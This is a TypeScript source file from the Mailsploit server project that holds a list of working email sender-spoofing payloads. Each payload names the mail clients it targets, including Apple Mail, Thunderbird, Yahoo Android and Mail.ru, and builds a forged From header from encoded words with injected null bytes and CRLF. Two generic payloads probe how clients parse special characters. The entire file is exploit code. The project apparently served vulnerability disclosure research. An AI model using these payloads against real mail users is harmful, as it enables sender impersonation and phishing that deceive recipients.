/*
 * Mailsploit Server
 * Copyright (C) 2018 Sabri Haddouche
 */

import * as btoa from 'btoa';
import {Dispatcher} from './Dispatcher';
import {Config} from './Config';

const DispatcherOriginalFrom = Config.Dispatcher.originalFrom;
const DispatcherOriginalDomainFrom = DispatcherOriginalFrom.split('@')[1];

const builtGenericTest: string = (() => {
  const tspecials = ['(', ')', '<', '>', '@', ',', ';', ':', '\\', '"', '/', '[', ']', '?', '.', '='];
  const prepayload: RegExpMatchArray = <RegExpMatchArray>(
    new Buffer(`BEGIN / ${tspecials.join('|')} / \0 PASSED NULL BYTE / \r\n PASSED CRLF / `)
      .toString('hex')
      .match(/.{1,2}/g)
  );
  return `=?utf-8?Q?${`=${prepayload.join('=').toUpperCase()}`}?==?utf-8?b?${btoa(`END`)}=?=`;
})();

export interface PayloadDirectory {
  name: string;
  representation?: string;
  generic?: boolean;
  build: (spoof: string) => string;
}

export const PayloadDirectory: Array<PayloadDirectory> = [
  {
    name: 'macOS ≤ 10.13.1 / iOS ≤ 11.2 Mail.app / Open-Xchange < 7.10.0 / CloudMagic Newton ≤ 9.8.79-like',
    representation: 'spoof\\0(spoof)@domain',
    build: spoof => {
      //return `"Donald J. Trump"=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=00?==?utf-8?b?${btoa(
      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=00?==?utf-8?b?${btoa(
        `(${spoof.replace('(', '\\(').replace(')', '\\)')})`,
      )}?=@${DispatcherOriginalDomainFrom}`;
    },
  },
  {
    name: 'Mozilla-Thunderbird ≤ 52.5.0-like',
    representation: 'spoof\\n\\0 <spoof\\n\\0@domain>',
    build: spoof => {
      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=0A=00?= <=?utf-8?b?${btoa(
        spoof,
      )}?==?utf-8?Q?=0A=00?=@${DispatcherOriginalDomainFrom}>`;
    },
  },
  {
    name: 'Variation #1 (Compatible with multiple clients)',
    representation: 'spoof\\0\\n@domain',
    build: spoof => {
      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=00=0A?=@${DispatcherOriginalDomainFrom}`;
    },
  },
  {
    name: 'Variation #2',
    representation: 'spoof" <spoof>\\0\\n <user@domain>',
    build: spoof => {
      return `=?utf-8?b?${btoa(
        `${spoof.replace(`"`, `\\"`)}" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
      )}?==?utf-8?Q?=00=0A?= <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #2.1',
    representation: 'spoof\\0\\n <user@domain>',
    build: spoof => {
      return `=?utf-8?b?${btoa(
        `${spoof.replace(`"`, `\\"`)}" <test>`,
      )}?==?utf-8?Q?=00=0A?= <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #2.2',
    representation: 'test" <spoof>\\0\\n <user@domain>',
    build: spoof => {
      return `=?utf-8?b?${btoa(
        `test" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
      )}?==?utf-8?Q?=00=0A?= <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #3', // Yahoo Android
    representation: '"spoof" <spoof>\\n\\0\\0\\0 <user@domain>',
    build: spoof => {
      return `"=?utf-8?b?${btoa(
        `"${spoof.replace(`"`, `\\"`)}" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
      )}?==?utf-8?Q?=0A=00=00=00?=" <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #3.1', // Yahoo Android
    representation: '"test" <spoof>\\n\\0\\0\\0 <user@domain>',
    build: spoof => {
      return `"=?utf-8?b?${btoa(
        `"test" <${spoof.replace(`<`, `\\<`).replace(`>`, `\\>`)}>`,
      )}?==?utf-8?Q?=0A=00=00=00?=" <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #3.2', // Yahoo Android
    representation: '"spoof" <test>\\n\\0\\0\\0 <user@domain>',
    build: spoof => {
      return `"=?utf-8?b?${btoa(
        `"${spoof.replace(`"`, `\\"`)}" <test>`,
      )}?==?utf-8?Q?=0A=00=00=00?=" <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Variation #4',
    representation: 'spoof\\n\\0@domain',
    build: spoof => {
      return `=?utf-8?b?${btoa(spoof)}?==?utf-8?Q?=0A=00?=@${DispatcherOriginalDomainFrom}`;
    },
  },
  /*{
    name: 'Variation #5', // Yahoo Android
    representation: 'spoof <user@domain>',
    build: spoof => {
      return `=?utf-8?b?${btoa(spoof)}?= ${DispatcherOriginalFrom}`;
    },
  },*/
  {
    name: 'Variation #6', // Mail.ru compatible
    representation: 'spoof(spoof@domain',
    build: spoof => {
      console.log(`=?utf-8?b?${btoa(`${spoof}(${spoof}`)}?==?utf-8?Q?=00?=@${DispatcherOriginalDomainFrom}`);
      return `=?utf-8?b?${btoa(`${spoof}(${spoof}`)}?==?utf-8?Q?=00?=@${DispatcherOriginalDomainFrom}`;
    },
  },
  {
    name: 'Generic test #1',
    generic: true,
    build: spoof => {
      console.log(`${builtGenericTest} <${DispatcherOriginalFrom}>`);
      return `${builtGenericTest} <${DispatcherOriginalFrom}>`;
    },
  },
  {
    name: 'Generic test #2',
    generic: true,
    build: spoof => {
      return `<${builtGenericTest}@${DispatcherOriginalDomainFrom}>`;
    },
  },
];

export const PayloadDirectoryCount = PayloadDirectory.length;
